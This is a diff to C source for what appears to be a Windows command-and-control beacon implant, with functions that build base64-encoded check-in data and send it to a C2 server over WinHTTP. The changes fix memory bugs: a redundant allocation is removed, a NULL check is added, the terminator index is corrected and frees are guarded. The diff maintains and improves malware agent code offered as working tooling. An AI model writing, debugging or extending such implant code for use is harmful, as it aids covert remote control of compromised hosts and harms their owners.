@@ -295,15 +295,11 @@ LPCSTR* BuildCheckinData(DWORD OpCode, LPCSTR Data, DWORD Mode)
     {
         size_t b64_len_out = (size_t)(dwEstSize * 2);
 
-        encoded_data = (CHAR*)malloc(b64_len_out * 2);
-        if(encoded_data == NULL)
-        {
-            DEBUG("malloc(): FAILED");
-            return NULL;
-        }
-
         encoded_data = base64_encode((const char*)Data, lstrlen(Data), &b64_len_out);
-        encoded_data[b64_len_out + 1] = '\0';
+	if (encoded_data == NULL){
+		return NULL;
+	}
+        encoded_data[b64_len_out - 1] = '\0';
 
         lpBuffer = (CHAR*)malloc(dwEstSize + b64_len_out);
         if (lpBuffer == NULL)
@@ -417,7 +413,7 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
 
     // finally send the actual request to the c2
     bResults = WinHttpSendRequest(hRequest, _POST_HEADER, _HEADER_LEN, (LPVOID)UriBuffer, strlen((char*)UriBuffer), strlen((char*)UriBuffer), 0);
-    free(UriBuffer);
+    if (UriBuffer) free(UriBuffer);
 
     // make sure the request was successful
 
@@ -533,6 +529,9 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
     WinHttpCloseHandle(hRequest);
     WinHttpCloseHandle(hSession);
     WinHttpCloseHandle(hConnect);
+    if (ResBuffer){
+	 free (ResBuffer);
+    }
     return argsBuffer;
 }
 
